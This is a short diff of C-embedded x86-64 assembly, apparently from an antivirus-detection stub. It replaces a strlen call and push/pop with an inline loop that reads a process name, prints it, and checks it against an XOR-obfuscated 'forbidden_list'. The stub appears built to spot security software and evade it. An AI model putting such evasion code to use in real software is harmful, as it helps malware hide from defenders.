@@ -176,27 +176,30 @@ static const char STUB_AV_DETECT[] =
 "strip_done:\n"
 "break\n"              //; [B7] rsi = debut du nom de processus lu, '\n' remplacé par '\0'
 
-    //; Afficher le nom de processus lu ([rsp+4096])
-"push rbx\n"
-"push rbp\n"
-"push r10\n"
-"push r12\n"
-"lea rsi, [rsp + 4128]\n"
-"call strlen\n"
-"mov rdx, rax\n"
+    //; Calculer la longueur de comm dans [rsp+4096] sans call/ret ni push/pop
+"lea rsi, [rsp]\n"
+"add rsi, 4096\n"
+"_ZERO rdx\n"
+"comm_len_loop:\n"
+"_ZERO rax\n"
+"_SET al, [rsi + rdx]\n"
+"cmp al, 0\n"
+"je comm_len_done\n"
+"inc rdx\n"
+"jmp comm_len_loop\n"
+"comm_len_done:\n"
+
+    //; Afficher comm (rdx = longueur, rsi = [rsp+4096])
 "mov rax, 1\n"
 "mov rdi, 1\n"
-"lea rsi, [rsp + 4128]\n"
 "syscall\n"
+
+    //; Afficher '\n'
 "mov rax, 1\n"
 "mov rdi, 1\n"
 "lea rsi, [newline]\n"
 "mov rdx, 1\n"
 "syscall\n"
-"pop r12\n"
-"pop r10\n"
-"pop rbp\n"
-"pop rbx\n"
 
     //; Comparer contre forbidden_list (XOR 42)
 "lea rsi, [forbidden_list]\n"
